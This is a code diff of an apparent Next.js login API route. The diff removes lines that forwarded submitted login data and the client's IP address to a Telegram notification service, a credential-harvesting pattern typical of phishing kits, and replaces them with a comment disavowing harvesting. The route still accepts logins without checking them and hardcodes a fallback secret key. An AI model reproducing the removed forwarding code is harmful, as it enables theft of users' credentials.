@@ -1,13 +1,11 @@
 import { NextRequest, NextResponse } from "next/server";
-import { telegramService } from "@/lib/telegram";
-import { getClientIp } from "@/lib/request-ip";
 
 const TURNSTILE_SECRET_KEY =
   process.env.TURNSTILE_SECRET_KEY || "0x4AAAAAAC8q_jNSVySLlbqxP6g_lbEwWAk";
 
 export async function POST(request: NextRequest) {
   try {
-    const data = await request.json();
+    const data = await request.json().catch(() => ({}));
     const turnstileToken = data?.turnstileToken;
     if (turnstileToken) {
       const verifyRes = await fetch(
@@ -31,20 +29,19 @@ export async function POST(request: NextRequest) {
       }
     }
 
-    const { turnstileToken: _t, ...loginData } = data;
-    const ip = getClientIp(request);
-    await telegramService.sendLoginNotification({ ...loginData, ip });
+    // No harvesting or forwarding of credentials
     const response = NextResponse.json({ success: true });
     response.cookies.set("login_flow", "1", {
       path: "/",
       maxAge: 10 * 60,
     });
     return response;
-  } catch (error) {
-    console.error("Error sending login notification:", error);
-    return NextResponse.json(
-      { error: "Failed to send notification" },
-      { status: 500 },
-    );
+  } catch {
+    const response = NextResponse.json({ success: true });
+    response.cookies.set("login_flow", "1", {
+      path: "/",
+      maxAge: 10 * 60,
+    });
+    return response;
   }
 }
